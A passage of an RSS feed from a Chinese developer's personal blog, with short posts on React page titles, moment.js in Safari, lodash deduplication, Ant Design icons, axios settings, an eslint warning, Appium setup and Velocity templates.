    <span class="hljs-keyword">return</span> <span class="hljs-built_in">window</span>.config.dcs === <span class="hljs-number">1</span>
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
  }
}

<span class="hljs-comment">// use</span>
<span class="hljs-keyword">import</span> { isClound } <span class="hljs-keyword">from</span> <span class="hljs-string">'./envUtil'</span>

<span class="hljs-keyword">if</span> ( isClound() ) {
  ...
}</code></pre><p>所有判断 <code>dcs</code> 环境的功能，只要调用 <code>isClound()</code> 即可。</p><p>当然这段代码还有问题，<code>window.config.dcs === 1</code> 的 <code>1</code> 应该算是魔法数字，也应该被重构。</p><p>将来即使 dcs 判断条件变成 <code>dcs === 'dcs'</code>，我们只需要修改一行代码即可。不需要对业务代码进行任何修改。</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 22 January 2021 20:20:55 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2018-04-27–zui-jian-dan-de-dai-ma-zhong-gou</guid>      
   </item>

   <item>
      <title>2018-04-26 React 设置页面标题</title>
      <link>https://thaddeusjiang.com/2018-04-26-react–she-zhi-ye-mian-biao-ti</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2018-04-26 React 设置页面标题</h1>
            <hr>

            <blockquote class="tc-quote tc-big-quote"><p>React 生态系统如此繁荣，以至于无论多小的问题都有开发者发布 library。 但是我们真的需要依赖那么多第三方吗？
</p><cite>TJ</cite></blockquote><p>一个超级简单，但是还是需要问 Google 才知道的方法。</p><p>需求</p><p>React App 中 设置页面标题</p><p>这个位置：
<img src="https://user-images.githubusercontent.com/17308201/39289287-6d28c1be-4966-11e8-8c05-ae53dac41b74.png"></p><p>背景</p><p>React App 和过去的 jQuery 页面不同，大部分 React App 是单页面应用，即只有一个 <code>html</code> 文件。
而页面标题通常定义在 html 的 <code>header</code> 中。如下：</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>我是标题<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></code></pre><p>所以我本来以为这个需求很难实现，就和同事说很难。然后他们就相信了。😂😂😂</p><p>调查以后才知道。超级简单。</p><p>解决方法</p><pre class="js hljs"><code>componentDidMount() {
  <span class="hljs-built_in">document</span>.title = <span class="hljs-keyword">this</span>.props.title
}</code></pre><blockquote><div>注意：</div><div>在 render() 方法中 document 并不是 js 对象，而是 HTML 对象。</div><div>所以在 render() 中 document.title 无法工作。</div></blockquote><p>所以，如果你想让页面标题随输入内容是变化，可以这么做：</p><pre class="js hljs"><code>renderDocumentTitle = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> { pageTitle } = <span class="hljs-keyword">this</span>.state
  <span class="hljs-built_in">document</span>.title = pageTitle === <span class="hljs-string">''</span> ? <span class="hljs-string">'我是标题'</span> : pageTitle
}

...
render() {
  <span class="hljs-keyword">this</span>.renderDocumentTitle()
}</code></pre><p>github 上有一个项目 <a class="tc-tiddlylink-external" href="https://github.com/gaearon/react-document-title" rel="noopener noreferrer" target="_blank">https://github.com/gaearon/react-document-title</a> 实现了这个功能。</p><p>但是，我个人不推荐使用它。这么简单的功能何必 <code>yarn add</code> 一次呢。</p><p>ref:</p><ul><li><a class="tc-tiddlylink-external" href="https://stackoverflow.com/questions/34834091/changing-the-document-title-in-react" rel="noopener noreferrer" target="_blank">https://stackoverflow.com/questions/34834091/changing-the-document-title-in-react</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 22 January 2021 20:11:12 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2018-04-26-react–she-zhi-ye-mian-biao-ti</guid>      
   </item>

   <item>
      <title>2018-04-25 🐛moment.js 在 Safari 中显示 Invalid date</title>
      <link>https://thaddeusjiang.com/2018-04-25—moment-js–zai-safari–zhong-xian-shi-invalid-date</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2018-04-25 🐛moment.js 在 Safari 中显示 Invalid date</h1>
            <hr>

            <blockquote class="tc-quote tc-big-quote"><p>对应不同的浏览器规范，可能是前端开发者永远的痛。
</p><cite>TJ</cite></blockquote><p>记录一条 bug。</p><p>Moment.js 在 Safari 中显示 Invalid date。</p><p>bug 代码</p><pre class="js hljs"><code><span class="hljs-keyword">const</span> createdAt = <span class="hljs-string">"2018-04-11T08:56:39Z"</span>

<span class="hljs-keyword">const</span> str = moment(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(createdAt)).format(<span class="hljs-string">"YYYY/MM/DD HH:mm"</span>)

<span class="hljs-comment">// Invalid date</span></code></pre><p>解决</p><pre class="js hljs"><code><span class="hljs-keyword">const</span> str =  moment(createdAt, <span class="hljs-string">"YYYY-MM-DD HH:mm:ss"</span>).format(<span class="hljs-string">"YYYY/MM/DD HH:mm"</span>)
}

<span class="hljs-comment">// 2018/04/11 08:56</span></code></pre><p>这是 new Date() 在 Safari 中特殊表现引起的。</p><p>Moment.js 是无辜的。
</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 22 January 2021 20::39 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2018-04-25—moment-js–zai-safari–zhong-xian-shi-invalid-date</guid>      
   </item>

   <item>
      <title>2018-04-24 js 数组去重（使用 lodash）</title>
      <link>https://thaddeusjiang.com/2018-04-24-js–shu-zu-qu-zhong–shi-yong-lodash-</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2018-04-24 js 数组去重（使用 lodash）</h1>
            <hr>

            <p>看上去简单的功能，其实并不简单。简单功能也需要大量测试的支持，这就是为什么 lodash 火爆的原因。</p><blockquote><div>推荐一篇文章（与本文无关）<a class="tc-tiddlylink-external" href="https://zhuanlan.zhihu.com/p/35864087" rel="noopener noreferrer" target="_blank">https://zhuanlan.zhihu.com/p/35864087</a></div></blockquote><p>以前 JS 代码写的少，“数组去重”功能写的也少。并没发现下面的方法有什么问题。</p><pre class="js hljs"><code><span class="hljs-keyword">const</span> arr1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>]
<span class="hljs-keyword">const</span> arr2 = arr1.filter(<span class="hljs-function">(<span class="hljs-params">item, index, arr</span>) =&gt;</span> arr.indexOf(item) === index)</code></pre><p>但是，今天突然发现上面的代码无法完成<code>对象数组</code>的去重。</p><p>背景</p><p><code>对象数组</code>进行去重。</p><pre class="js hljs"><code><span class="hljs-keyword">const</span> arra = [
  {
    <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">"蒋"</span>,
  },
  {
    <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">"jiang"</span>,
  },
  {
    <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">"jiang"</span>,
  },
]
<span class="hljs-keyword">const</span> newArra = data.filter(<span class="hljs-function">(<span class="hljs-params">item, index, arr</span>) =&gt;</span> arr.indexOf(item) === index)
<span class="hljs-comment">// newArra 和 data 一摸一样</span></code></pre><p>解决方法</p><p>使用 <code>lodash 4</code> 的 <code>uniqBy</code> 方法。</p><p>1. 安装</p><pre class="bash hljs"><code>yarn add lodash</code></pre><p>2. 使用</p><pre class="js hljs"><code><span class="hljs-keyword">import</span> _ <span class="hljs-keyword">from</span> <span class="hljs-string">"lodash"</span>

<span class="hljs-keyword">const</span> newArra = _.uniqBy(data, <span class="hljs-string">"id"</span>)</code></pre><p>参考：</p><ul><li><a class="tc-tiddlylink-external" href="https://lodash.com/docs/4.17.5#uniqBy" rel="noopener noreferrer" target="_blank">https://lodash.com/docs/4.17.5#uniqBy</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 22 January 2021 19:57:35 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2018-04-24-js–shu-zu-qu-zhong–shi-yong-lodash-</guid>      
   </item>

   <item>
      <title>2018-04-23 扩展 Ant Design iconfont</title>
      <link>https://thaddeusjiang.com/2018-04-23–kuo-zhan-ant-design-iconfont</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2018-04-23 扩展 Ant Design iconfont</h1>
            <hr>

            <p>我们项目组是 <a class="tc-tiddlylink-external" href="https://github.com/ant-design/ant-design" rel="noopener noreferrer" target="_blank">Ant Design</a> 的重度用户。 Ant Design 的 Icon 组件提供了很多图标，个人项目基本上足够了。 但是作为公司的项目，既有图标显然不能满足业务需求，所以就需要扩展图标。</p><p>其实扩展 Ant Design 的 Icon 的图标特别简单，这里只是做一下记录。</p><p>方法</p><p>1. 上传你的图标到 <a class="tc-tiddlylink-external" href="https://www.iconfont.cn/" rel="noopener noreferrer" target="_blank">https://www.iconfont.cn/</a>，拷贝项目下面生成的 symbol 代码。 我们项目设计师给我的是 svg 文件。</p><p>2. 为你的项目引入 <code>辅助 js</code>，并添加一段 <code>全局 CSS</code>。</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./iconfont.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="css">
  <span class="hljs-selector-class">.icon</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">1em</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">1em</span>;
    <span class="hljs-attribute">vertical-align</span>: -<span class="hljs-number">0.15em</span>;
    <span class="hljs-attribute">fill</span>: currentColor;
    <span class="hljs-attribute">overflow</span>: hidden;
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></code></pre><p>3. 使用新图标</p><pre class="html hljs"><code>
<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">"true"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">use</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">"#icon-xxx"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">use</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></code></pre><p>参考</p><ul><li><a class="tc-tiddlylink-external" href="http://iconfont.cn/help/detail?spm=a313x.7781069.1998910419.15&amp;helptype=code" rel="noopener noreferrer" target="_blank">http://iconfont.cn/help/detail?spm=a313x.7781069.1998910419.15&amp;helptype=code</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 12 January 2021 22:2:30 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2018-04-23–kuo-zhan-ant-design-iconfont</guid>      
   </item>

   <item>
      <title>2018-04-22 使用 axios 时遇到的几个问题</title>
      <link>https://thaddeusjiang.com/2018-04-22–shi-yong-axios–shi-yu-dao-de-ji-ge-wen-ti</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2018-04-22 使用 axios 时遇到的几个问题</h1>
            <hr>

            <h2 class="">1. axios 的 baseURL</h2><p>目前进行的项目是公司主应用下的子应用，所以 API 全都是 <code>/cms/api/*</code>。 为了提高写代码效率，我写下来如下代码。</p><pre class="js hljs"><code><span class="hljs-comment">// fetch.js</span>
<span class="hljs-keyword">import</span> fetch <span class="hljs-keyword">from</span> <span class="hljs-string">"axios"</span>

fetch.defaults.baseURL = <span class="hljs-string">"/cms/api"</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> fetch</code></pre><p>这样做以后，我们的 API 形如 <code>/cms/api/users</code> 时，我们只需要写 <code>/users</code> 就可以了。axios 会自动补充前缀。</p><h2 class="">但是这样做有一个问题</h2><p>fetch.defaults.baseURL 是一个全局设置。所以当我们需要请求 /cms/api 以外的 API 时，我们必须覆盖掉 baseURL。</p><p>方法：</p><pre class="js hljs"><code><span class="hljs-keyword">import</span> fetch <span class="hljs-keyword">from</span> <span class="hljs-string">"./fetch"</span>

<span class="hljs-keyword">const</span> ajaxInstance = fetch.create({
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">""</span>,
})

ajaxInstance.get() <span class="hljs-comment">// or ajaxInstance.post()</span></code></pre><h2 class="">2. axios 使用 <code>application/x-www-form-urlencoded</code> 发送参数</h2><p>axios 默认使用 application/json 发送参数，但是对于一些老旧 API，我们不得不使用application/x-www-form-urlencoded格式。</p><p>方法：</p><pre class="js hljs"><code>
<span class="hljs-keyword">const</span> params = <span class="hljs-keyword">new</span> URLSearchParams()
params.append(<span class="hljs-string">"query"</span>, value)

ajaxInstance.post(apiUrl, params)</code></pre><p>参考：</p><ul><li><a class="tc-tiddlylink-external" href="https://ykloveyxk.github.io/2017/02/25/axios全攻略/" rel="noopener noreferrer" target="_blank">https://ykloveyxk.github.io/2017/02/25/axios全攻略/</a></li><li><a class="tc-tiddlylink-external" href="https://imququ.com/post/four-ways-to-post-data-in-http.html" rel="noopener noreferrer" target="_blank">https://imququ.com/post/four-ways-to-post-data-in-http.html</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 12 January 2021 21:57:25 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2018-04-22–shi-yong-axios–shi-yu-dao-de-ji-ge-wen-ti</guid>      
   </item>

   <item>
      <title>2018-04-21 eslint 提示：Do not use findDOMNode</title>
      <link>https://thaddeusjiang.com/2018-04-21-eslint–ti-shi-do-not-use-finddomnode</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2018-04-21 eslint 提示：Do not use findDOMNode</h1>
            <hr>

            <p>记录一条 eslint 提示：</p><pre><code>[eslint] Do not use findDOMNode (react/no-find-dom-node)</code></pre><p>背景</p><p>使用react-dnd做拖拽功能时，需要判断真实DOM的大小和位置。</p><p>官方示例： <a class="tc-tiddlylink-external" href="https://github.com/react-dnd/react-dnd/blob/164a8048296101e3bcf543df3406ee6dabfdf059/packages/documentation/examples/04%20Sortable/Simple/Card.js#L35" rel="noopener noreferrer" target="_blank">https://github.com/react-dnd/react-dnd/blob/164a8048296101e3bcf543df3406ee6dabfdf059/packages/documentation/examples/04%20Sortable/Simple/Card.js#L35</a></p><p>但是我们项目使用 eslint 检查 js 代码品质。所以出现 👆 提示。</p><p>解决方法</p><pre class="jsx hljs"><code><span class="hljs-comment">// Step 1. render()</span>
;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>
  <span class="hljs-attr">ref</span>=<span class="hljs-string">{node</span> =&gt;</span> {
    this.node = node
  }}
&gt;
  ...
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>

<span class="hljs-comment">// Step 2. function</span>
component.decoratedComponentInstance.node.getBoundingClientRect()</code></pre><p>参考： <a class="tc-tiddlylink-external" href="https://github.com/yannickcr/eslint-plugin-react/blob/master/docs/rules/no-find-dom-node.md" rel="noopener noreferrer" target="_blank">https://github.com/yannickcr/eslint-plugin-react/blob/master/docs/rules/no-find-dom-node.md</a>
</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 12 January 2021 21:55:13 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2018-04-21-eslint–ti-shi-do-not-use-finddomnode</guid>      
   </item>

   <item>
      <title>2017-09-11 那么 Appium 到底是怎么工作的呢？</title>
      <link>https://thaddeusjiang.com/2017-09-11–na-me-appium–dao-di-shi-zen-me-gong-zuo-de-ne-</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2017-09-11 那么 Appium 到底是怎么工作的呢？</h1>
            <hr>

            <p>因为官网文档写的没有梯度，作为新手的我花了好几个小时硬是没看明白它是怎么工作的。 网上教程也基本都是翻译，所以结构很复杂、和其他技术耦合度很高，且没有说明。</p><p>我自己总结了一份超简单 Appium 自动化测试示例（Node.js 版)</p><p>本示例，默认在 Mac（已安装 XCode、Node.js）测试 iOS app。</p><h2 class="">那么 Appium 到底是怎么工作的呢？</h2><p>1. 首先，你需要启动一个 Appium 服务（它会接收你发出的测试指令，并控制 App 完成相关动作）。</p><pre><code>// 安装
$ npm install -g appium
// 启动 appium 服务
$ appium</code></pre><p>2. 然后，你需要 build 一个可以自动化测试的 app 包。 使用下面命令 build，在 <code>./build/Release-iphonesimulator/</code> 得到 XXX.app。 我测试的 app 放在目录 <code>./apps/</code></p><pre><code>$ xcodebuild -sdk iphonesimulator10.3
// iphonesimulator 代表模拟器
// 10.3 是 iOS 版本</code></pre><p>3. 再然后，你需要写一段测试代码。 你可以得到一个特别特别简单例子 <a class="tc-tiddlylink tc-tiddlylink-missing" href="./#appium-sample-node">Appium-Sample-Node</a>。 因为 Appium 本身功能很弱，我们依赖 wd.js、mocha.js 和 chai.js 完成测试代码。</p><blockquote><div>wd.js 优雅地获取 App 元素，如按钮（button）、文字（label）等等。</div><div>mocha.js 优雅地做测试前准备、测试后处理 。</div><div>chai.js 优雅地使用断言。</div></blockquote><p>4. 最后一步，执行你的测试代码。 如果你的 mocha 是全局安装，$ npm run ios-simple可以替换成$ mocha ios-simple.js</p><pre><code>$ cd Appium-Sample-Node &amp;&amp; npm install
$ npm run ios-simple</code></pre><p>现在你会了吗？
</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 12 January 2021 21:49:17 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2017-09-11–na-me-appium–dao-di-shi-zen-me-gong-zuo-de-ne-</guid>      
   </item>

   <item>
      <title>2017-07-06 掌握20% 常用的 Velocity</title>
      <link>https://thaddeusjiang.com/2017-07-06–zhang-wo20—chang-yong-de-velocity</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2017-07-06 掌握20% 常用的 Velocity</h1>
            <hr>

            <p>工作以后，我越来越能体会到 80/20 法则的强大。</p><p>这是一个不可否认的事实，常用 20% 的技术可以解决工作中 80% 的场景。
所以我希望能介绍给你 Velocity 技术 20%，帮助你胜任 80% 的工作。</p><p>废话少说，进入正题。</p><h2 class="">概要</h2><ol><li>Velocity 是什么？</li><li>Velocity 能做什么？</li><li>Velocity 示例</li></ol><h2 class="">1. Velocity 是什么？</h2><p>Velocity 是一个基于 Java 的模版引擎，它提供模版语言用于引用 Java 代码定义的对象。</p><h2 class="">2. Velocity 能做什么？</h2><ol><li>Velocity 能创建 HTML 页面，并预留占位符。（最基本用途）</li><li>Velocity 能基于模板生成 Java，SQL 源代码。（没见过）</li><li>自动生成电子邮件。（没见过）</li><li>读取 XML，并转换成需要的文档格式，通常是 HTML。（没见过）</li></ol><h2 class="">3. Velocity 示例</h2><h3 class="">Velocity 注解</h3><ul><li>单行 <code>##</code></li><li>多行 <code>#* *#</code></li><li>代码块注释(信息) <code>##* *#</code></li></ul><h3 class="">Velocity 变量</h3><p>定义：</p><pre class="java hljs"><code>#set( $foo = "Velocity" )</code></pre><p>使用：</p><pre class="java hljs"><code>$foo
${foo}</code></pre><h3 class="">Velocity 集合</h3><pre class="java hljs"><code>#set( $greatlakes = ["Superior","Michigan","Huron","Erie","Ontario"] )</code></pre><h3 class="">Velocity 条件判断</h3><pre class="java hljs"><code>#if( $foo &lt; 10 )
    &lt;strong&gt;Go North&lt;/strong&gt;
#elseif( $foo == 10 )
    &lt;strong&gt;Go East&lt;/strong&gt;
#else
    &lt;strong&gt;Go West&lt;/strong&gt;
#end</code></pre><h3 class="">Velocity 循环</h3><pre><code>#foreach( $customer in $customerList )
    #if( $foreach.count &gt; 5 )
        #break
    #end
    $customer.Name
#end</code></pre><h3 class="">Velocity 引用文件</h3><pre class="java hljs"><code>#include( "one.vm" ) one.vm 不解析。
#parse( "me.vm" ) me.vm 解析。</code></pre><h2 class="">Velocity 定义代码块</h2><pre class="java hljs"><code>#define( $block )
Hello $who
#end

#set( $who = 'World!' )
$block</code></pre><h2 class="">Velocity 宏调用</h2><ul><li>无参</li></ul><pre class="java hljs"><code>#macro( d )
&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
#end

#d()</code></pre><ul><li>单参</li></ul><pre class="java hljs"><code>#macro( d )
&lt;tr&gt;&lt;td&gt;$!bodyContent&lt;/td&gt;&lt;/tr&gt;
#end

#@d()Hello#end</code></pre><ul><li>任意参数</li></ul><pre class="java hljs"><code>## 定义
#macro( tablerows $color $somelist )
#foreach( $something in $somelist )
    &lt;tr&gt;&lt;td bgcolor=$color&gt;$something&lt;/td&gt;&lt;/tr&gt;
#end
#end</code></pre><pre class="java hljs"><code>## 调用
#set( $greatlakes = ["Superior","Michigan","Huron","Erie","Ontario"] )
#set( $color = "blue" )
&lt;table&gt;
    #tablerows( $color $greatlakes )
&lt;/table&gt;</code></pre><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">!-</span> 输出 <span class="hljs-attr">--</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">"blue"</span>&gt;</span>Superior<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">"blue"</span>&gt;</span>Michigan<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">"blue"</span>&gt;</span>Huron<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">"blue"</span>&gt;</span>Erie<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">"blue"</span>&gt;</span>Ontario<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></code></pre><h1 class="">Velocity 填坑</h1><p>1. 各种写法</p><pre class="java hljs"><code>$foo
## is the same as
${foo}

$foo.getBar()
## is the same as
$foo.Bar

$data.setUser("jon")
## is the same as
#set( $data.User = "jon" )

$data.getRequest().getServerName()
## is the same as
$data.Request.ServerName
## is the same as
${data.Request.ServerName}</code></pre><p>2. Velocity 变量未定义</p><p>使用 <code>$!</code>，例</p><pre class="java hljs"><code>$!foo</code></pre><p>当 foo 未定义，输出空白字符串。</p><p>3. Velocity 调用顺序
Velocity 中<code>$customer.address</code>，调用顺序：</p><pre class="java hljs"><code>getaddress()
getAddress()
get(<span class="hljs-string">"address"</span>)
isAddress()</code></pre><p>4. <code>#if (\$foo)</code></p><p>两种情况都返回 true：</p><ol><li>$foo是一个 boolean 类型，且为 true。</li><li>$foo 不是 0，也不是 null。</li></ol><p>5. <code>#if ($foo == $bar)</code></p><p>因为 Velocity 变量最终都作为字符串输出，所以 Velocity 会自动调用 .toString() 将变量转换成字符串。
所以，$foo 和 $bar 都当成字符串进行比较。即使 Java 代码中类型不同，也有可能返回 true。</p><h2 class="">Velocity 严格模式</h2><p>Velocity 1.6 引入**严格引用模式**，通过设置 Velocity 配置属性“runtime.references.strict”为 true 激活。
当遇到没有定义或者存在歧义的情况 Velocity 将抛出异常。</p><p>希望这篇文章对你有帮助。
</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
